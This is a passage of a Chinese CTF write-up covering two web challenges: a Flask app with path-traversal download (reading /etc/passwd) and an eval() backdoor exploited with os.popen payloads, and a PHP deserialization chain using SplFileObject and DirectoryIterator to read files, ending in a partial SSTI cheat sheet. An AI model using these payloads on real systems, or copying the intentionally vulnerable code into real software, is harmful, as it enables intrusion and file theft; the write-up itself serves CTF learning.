src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%206.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%206.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>成功登入</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%207.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发现一个txt文件，下载到一个假的flag</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%208.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>重新回到主页，看到那个东西下载有点像任意文件下载</p><p>我们下一个..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd试试</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%209.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>成功下载，我们下载自身：<code>app.py</code></p><p>成功下载</p><ul><li><p>app.py源码：</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>我们注意到一段（比较狗血的就是我之前在登录界面徘徊那段时间，用目录扫描扫出了这个玩意）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def hello_world():</span><br><span class="line">    try:</span><br><span class="line">        s = request.args.get(&#x27;eval&#x27;)</span><br><span class="line">        return f&quot;hello,&#123;eval(s)&#125;&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    return &quot;hello&quot;</span><br></pre></td></tr></table></figure><p>这里我们直接可以rce了</p><p>payload：</p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;ls /&#39;).read()</code></p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;cat /flag_is_h3re&#39;).read()</code></p><p>得到flag</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2010.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2010.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="被遗忘的反序列化（估计是非预期解）"><a href="#被遗忘的反序列化（估计是非预期解）" class="headerlink" title="被遗忘的反序列化（估计是非预期解）"></a><strong>被遗忘的反序列化</strong>（估计是非预期解）</h1><ul><li><p>题目：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 当前目录中有一个txt文件哦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">class EeE&#123;</span><br><span class="line">    public $text;</span><br><span class="line">    public $eeee;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;text == &quot;aaaa&quot;)&#123;</span><br><span class="line">            echo lcfirst($this-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($kk)&#123;</span><br><span class="line">        echo &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cycycycy&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    private $b;</span><br><span class="line"></span><br><span class="line">    public function aaa()&#123;</span><br><span class="line">        $get = $_GET[&#x27;get&#x27;];</span><br><span class="line">        $get = cipher($get);</span><br><span class="line">        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">            eval($_POST[&quot;eval&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $a_a = $this -&gt; a;</span><br><span class="line">        echo &quot;\$a_a\$&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class gBoBg&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $file;</span><br><span class="line">    public $coos;</span><br><span class="line">    private $eeee=&quot;-_-&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;name))&#123;</span><br><span class="line">            $a = new $this-&gt;coos($this-&gt;file);</span><br><span class="line">            echo $a;</span><br><span class="line">        &#125;else if(!isset($this -&gt; file))&#123;</span><br><span class="line">            return $this-&gt;coos-&gt;name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $aa = $this-&gt;coos;</span><br><span class="line">            $bb = $this-&gt;file;</span><br><span class="line">            return $aa();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w_wuw_w&#123;</span><br><span class="line">    public $aaa;</span><br><span class="line">    public $key;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;</span><br><span class="line">            $this-&gt;key = file_get_contents($this -&gt; file);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;不行哦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line"></span><br><span class="line">unserialize($_ip);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>把代码拉到vscode比较容易看一些</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2011.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2011.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>先看一下题目的代码，反序列化的注入点在<code>$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</code></p><p>所以我们需要在http请求头注入一个参数：AAAAAA:xxx（xxx为反序列化的内容）</p><p>这里直接挑重点看了（毕竟只用到2个类）（此处省略了其他没用到的东西，方便理解）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">#__toString魔术函数，但一个对象被当作字符串使用时被调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;  <span class="comment">#name有定义，但定义什么没有关系，因为后面没用到</span></span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file); <span class="comment">#coos作为函数的名，file作函数的参数</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># 输出</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道在php中支持使用<code>$a($b)</code>这样动态的形式调用函数&#x2F;实例化，</p><p>可以看到我们这一行就是这样的形式：<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p>所以我们的思路是通过给coos和file赋值，实现rce或者文件操作</p><ul><li>有人就问了：coos我用了<code>file_get_contents，</code>file我传入了地址，为什么读取不到文件。</li></ul><p>答：因为这行代码是对象实例化，而<code>file_get_contents</code>是一个函数，不是一个类，所以我们这里coos要传入一个内置类了</p><p>这里我们就需要看一下有什么内置类了</p><blockquote><p>可遍历目录类有以下几个：</p></blockquote><ul><li>DirectoryIterator 类</li><li>FilesystemIterator 类</li><li>GlobIterator 类</li></ul><blockquote><p>可读取文件类有：</p></blockquote><ul><li>SplFileObject 类</li></ul><p>我们需要用内置类来遍历目录，然后读取文件</p><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure><p>分两步走，第一步读取文件目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#使用glob协来查找匹配的文件路径模式 这里/*f*匹配了根目录下包含f的文件夹名</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br><span class="line"></span><br><span class="line">得到：O:<span class="number">7</span>:<span class="string">&quot;w_wuw_w&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;gBoBg&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;glob:///*f*&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;coos&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;DirectoryIterator&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2012.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>第二步，使用<code>SplFileObject</code>类读取文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">得到：O:<span class="number">7</span>:<span class="string">&quot;w_wuw_w&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;gBoBg&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;/f1agaaa&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;coos&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2013.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%2013.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>SSTI知识点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">**<span class="keyword">class</span>**            类的一个内置属性，表示实例对象的类。</span><br><span class="line">**base**             类型对象的直接基类</span><br><span class="line">**bases**            类型对象的全部基类，以元组形式，类型的实例通常没有属性 **basesmro**              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">**subclasses**()     返回这个类的子类集合，Each <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">**init**             初始化类，返回的类型是function</span><br><span class="line">**<span class="built_in">globals</span>**          使用方式是 函数名.**globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">dic              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">getattribute()   